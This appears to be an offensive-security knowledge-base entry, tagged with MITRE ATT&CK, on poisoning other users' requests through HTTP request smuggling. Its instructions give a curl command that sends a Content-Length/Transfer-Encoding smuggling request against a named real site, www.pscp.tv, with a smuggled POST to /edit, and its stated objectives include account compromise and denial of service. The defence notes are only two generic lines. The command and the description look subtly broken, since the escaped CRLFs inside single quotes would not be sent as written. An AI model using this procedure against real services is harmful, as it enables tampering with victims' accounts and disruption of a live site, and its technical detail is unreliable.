---
tags:
  - http-smuggling
  - request-poisoning
  - dos
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
commands:
  - '[[commands/craft-http-smuggling-poisoning-request]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Endpoint Denial of Service]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 5e142df0-8c24-4049-abb1-5f1f8982b3f9
created_at: '2025-12-13T09:01:21.913Z'
updated_at: '2025-12-13T09:01:21.913Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Endpoint Denial of Service]]'
---
# Poison Victim Requests via Injected Payloads in HTTP Smuggling

## Summary

This procedure injects malicious GET or POST payloads into victim requests via HTTP smuggling, enabling poisoning for impacts like DoS, CSRF bypass, or account modifications.

## Description

Without extra CRLFs in GET injections or using oversized Content-Length in POST, the smuggled request poisons subsequent ones. This can link attacker accounts via cookies or edit descriptions on targets like pscp.tv.

## Requirements

1. Burp Suite access
2. Target with vulnerable subdomains
3. Ability to monitor victim interactions

## Defense

Defensive measures and detection strategies:

- Enforce strict request validation
- Use WAF to detect smuggling patterns

## Objectives

1. Inject payloads successfully
2. Achieve request poisoning
3. Demonstrate high-impact outcomes like account compromise

## Instructions

### Step 1: Craft Poisoning Request

**Context**: Inject a POST payload to alter victim requests.

**Command** ([[commands/craft-http-smuggling-poisoning-request]]):

```bash
curl -i -s -k -X POST 'https://www.pscp.tv/' \
-H 'Content-Length: 100' \
-H 'Transfer-Encoding: chunked' \
--data '0\r\nPOST /edit HTTP/1.1\r\nHost: www.pscp.tv\r\nContent-Length: 10\r\n\r\nmaliciousdata'
```

> This poisons the next request, potentially editing account details.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Impact]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Endpoint Denial of Service]]

### Sub-Techniques



## Commands Used

- [[commands/craft-http-smuggling-poisoning-request]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[http-smuggling]]
- [[request-poisoning]]
- [[dos]]
